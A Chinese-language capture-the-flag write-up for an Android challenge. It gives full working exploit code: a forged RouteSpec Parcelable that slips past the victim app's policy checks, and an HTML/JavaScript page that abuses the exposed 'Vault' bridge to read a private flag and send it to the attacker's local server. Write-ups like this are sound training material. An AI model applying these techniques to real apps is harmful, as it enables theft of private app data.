# ParcelBridge Vault Writeup

## 漏洞入口

目标 APK 中有一个导出的 `RouterActivity`：

```xml
<activity
    android:name=".RouterActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="com.sctf.victim.OPEN" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

`RouterActivity` 会从 Intent extras 里读取一个 `RouteSpec`：

```java
Bundle extras = intent.getExtras();
extras.setClassLoader(RouteSpec.class.getClassLoader());
RouteSpec spec = extras.getParcelable("route");
```

这里的关键点是：发送方 APK 可以自己定义一个同名类：

```text
com.sctf.victim.RouteSpec
```

发送 Intent 时，系统调用选手 APK 中这个类的 `writeToParcel()`；目标 APK 收到后，因为设置了目标端 ClassLoader，会用目标 APK 自己的 `RouteSpec.CREATOR` 读取 Parcel。

因此，选手可以控制 Parcel 写入布局，让目标端读出攻击者想要的字段。

## Parcelable 绕过

目标端 `RouteSpec(Parcel in)` 的读取逻辑大致如下：

```java
version = in.readInt();
url = in.readString();

if ((version & 1) == 0) {
    origin = in.readString();
    options = in.readBundle(RouteSpec.class.getClassLoader());
} else {
    options = in.readBundle(RouteSpec.class.getClassLoader());
    origin = in.readString();
}

bridgeMode = in.readInt();

if (version >= 3) {
    proof = in.createByteArray();
    tags = in.createStringArrayList();
}

sessionId = in.readLong();
```

官方解选择：

```text
version = 3
```

原因：

```text
1. 3 是奇数，目标端按 options -> origin 读取。
2. 3 >= 3，目标端会继续读取 proof 和 tags。
```

所以选手侧伪造类的写入顺序应为：

```text
version
url
options
origin
bridgeMode
proof
tags
sessionId
```

关键代码：

```java
package com.sctf.victim;

import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import java.util.ArrayList;

public class RouteSpec implements Parcelable {
    public int version;
    public String url;
    public String origin;
    public Bundle options;
    public int bridgeMode;
    public long sessionId;
    public byte[] proof;
    public ArrayList<String> tags;

    @Override
    public void writeToParcel(Parcel dest, int flags) {
        dest.writeInt(version);
        dest.writeString(url);
        dest.writeBundle(options);
        dest.writeString(origin);
        dest.writeInt(bridgeMode);
        dest.writeByteArray(proof);
        dest.writeStringList(tags);
        dest.writeLong(sessionId);
    }

    @Override
    public int describeContents() {
        return 0;
    }

    public static final Creator<RouteSpec> CREATOR = new Creator<RouteSpec>() {
        @Override
        public RouteSpec createFromParcel(Parcel in) {
            return new RouteSpec();
        }

        @Override
        public RouteSpec[] newArray(int size) {
            return new RouteSpec[size];
        }
    };
}
```

注意：选手 APK 的 manifest package 不能是 `com.sctf.victim`，否则会被 runner 拒绝。可以使用：

```text
APK package: com.sctf.exp
内部伪造类: com.sctf.victim.RouteSpec
```

## 通过 RoutePolicy

`RoutePolicy` 要求 `RouteSpec` 满足：

```text
origin == https://vault.sctf.local
options["signed"] == true
bridgeMode 包含 0x2
sessionId != 0
proof 长度 >= 4
url 是 http://127.0.0.1:<高端口>/...
```

构造如下：

```java
RouteSpec spec = new RouteSpec();
spec.version = 3;
spec.url = "http://127.0.0.1:31337/payload.html";
spec.origin = "https://vault.sctf.local";
spec.options = new Bundle();
spec.options.putBoolean("signed", true);
spec.bridgeMode = 2;
spec.sessionId = 0x1337133713372026L;
spec.proof = new byte[]{'S', 'C', 'T', 'F'};
spec.tags = new ArrayList<>();
spec.tags.add("vault:mobile");
```

然后发送显式 Intent：

```java
Intent intent = new Intent("com.sctf.victim.OPEN");
intent.setPackage("com.sctf.victim");
intent.putExtra("route", spec);
intent.putExtra("trace_id", "exp-" + Long.toHexString(System.nanoTime()));
intent.putExtra("profile", "mobile");
startActivity(intent);
```

通过校验后，目标 APK 会启动非导出的 `WebVaultActivity`，并加载：

```text
http://127.0.0.1:31337/payload.html
```

在同一个 Android 模拟器中，`127.0.0.1` 指向设备本机。选手 APK 可以先开一个本地 HTTP 服务监听 `31337`，给目标 WebView 返回攻击页面。

## JSBridge 利用

`WebVaultActivity` 会在满足 `bridgeMode & 0x2 != 0` 时注入：

```java
webView.addJavascriptInterface(new VaultBridge(...), "Vault");
```

`VaultBridge` 暴露了：

```text
open()
nonce()
commit()
export()
```

读取 flag 需要创建并 seal 一个 session。`nonce()` 已经直接暴露正确 nonce，所以不用逆算法。

攻击页面：

```html
<!doctype html>
<html>
<body>
<script>
function parseKV(s) {
  var o = {};
  s.split('&').forEach(function(p) {
    var i = p.indexOf('=');
    if (i > 0) o[p.slice(0, i)] = p.slice(i + 1);
  });
  return o;
}

try {
  var opened = Vault.open('client=web&stage=open');
  var h = parseKV(opened).handle;
  var n = Vault.nonce();
  Vault.commit(h, 'purpose=export&seal=1&nonce=' + encodeURIComponent(n));
  var flag = Vault.export(h);
  fetch('/done?flag=' + encodeURIComponent(flag));
} catch (e) {
  fetch('/done?flag=' + encodeURIComponent('ERR_JS_' + e));
}
</script>
</body>
</html>
```

`Vault.export()` 会读取目标 APK 私有目录中的 flag，并返回给 WebView 页面。页面再通过 `/done?flag=...` 回传给选手 APK 的本地 HTTP 服务。
